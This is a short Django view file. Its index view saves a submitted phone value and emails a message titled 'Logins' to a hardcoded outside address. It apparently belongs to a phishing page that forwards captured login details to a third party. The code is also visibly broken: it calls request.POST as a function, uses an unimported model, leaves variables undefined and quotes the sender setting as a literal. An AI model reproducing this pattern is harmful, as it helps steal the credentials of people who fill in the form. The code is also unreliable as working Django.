from django.shortcuts import render, redirect
from django.core.mail import send_mail
from django.conf import settings

# Create your views here.

def index(request):	
	if request.method == 'POST':
		phone= request.POST('phone')
		post=Post(phone=phone)
		post.save()

		send_mail(
			'Logins',#title
			message, #message
			'settings.EMAIL_HOST_USER', #sender if not available considered the default or configered
			[email,'oscarwilliam1978@gmsail.com'], #reciver email
			fail_silently=False
		)
	
	return render(request,'index.html',)
